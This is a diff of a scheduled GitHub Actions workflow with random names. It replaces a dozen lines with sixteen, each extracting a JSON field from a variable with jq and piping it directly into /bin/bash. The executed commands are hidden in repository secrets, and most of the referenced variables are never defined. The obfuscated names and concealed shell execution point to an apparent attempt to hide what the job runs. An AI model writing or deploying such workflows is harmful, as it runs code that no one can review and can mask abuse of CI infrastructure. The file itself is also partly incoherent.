@@ -3,7 +3,8 @@ name: ershierhoal
 on:
   workflow_dispatch:
   schedule:
-    - cron: '16 4/6 * * *'
+    - cron: '36 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,18 +12,22 @@ jobs:
       - uses: actions/checkout@v4
       - name: ershierhoal
         env:
-          ryq088: ${{ secrets.ryq088 }}
+          ldw64: ${{ secrets.ldw64 }}
         run: |
-          echo $ryq088 | jq -r .grcdh66007 | /bin/bash
-          echo $njw65 | jq -r .gltxr68042 | /bin/bash
-          echo $whwhq05642 | jq -r .sgbub72822 | /bin/bash
-          echo $bzdl8 | jq -r .zoczp33916 | /bin/bash
-          echo $rrs1007 | jq -r .he5 | /bin/bash
-          echo $nro9706 | jq -r .rggzo96 | /bin/bash
-          echo $kmdy33075 | jq -r .zv3 | /bin/bash
-          echo $wt18628 | jq -r .lfuc928 | /bin/bash
-          echo $vrdv594 | jq -r .rygbe7 | /bin/bash
-          echo $gvad74643 | jq -r .ej8 | /bin/bash
-          echo $ml414 | jq -r .ty750 | /bin/bash
-          echo $vlii08 | jq -r .jzmnn877 | /bin/bash
+          echo $ldw64 | jq -r .bdrqd55 | /bin/bash
+          echo $hzth72 | jq -r .rcol30160 | /bin/bash
+          echo $gdae2729 | jq -r .gg81 | /bin/bash
+          echo $exkrx69017 | jq -r .meql907 | /bin/bash
+          echo $r8 | jq -r .ykw8610 | /bin/bash
+          echo $olhe98038 | jq -r .pzyq248 | /bin/bash
+          echo $saa29 | jq -r .a88 | /bin/bash
+          echo $ra5621 | jq -r .nft76 | /bin/bash
+          echo $eo376 | jq -r .uevzz72853 | /bin/bash
+          echo $x66610 | jq -r .zrjb3219 | /bin/bash
+          echo $fq2320 | jq -r .oboz5 | /bin/bash
+          echo $krbvu9613 | jq -r .cofqq3 | /bin/bash
+          echo $su8 | jq -r .xmn9 | /bin/bash
+          echo $e8 | jq -r .bz9 | /bin/bash
+          echo $gbryq83 | jq -r .s296 | /bin/bash
+          echo $wm784 | jq -r .x3569 | /bin/bash
 
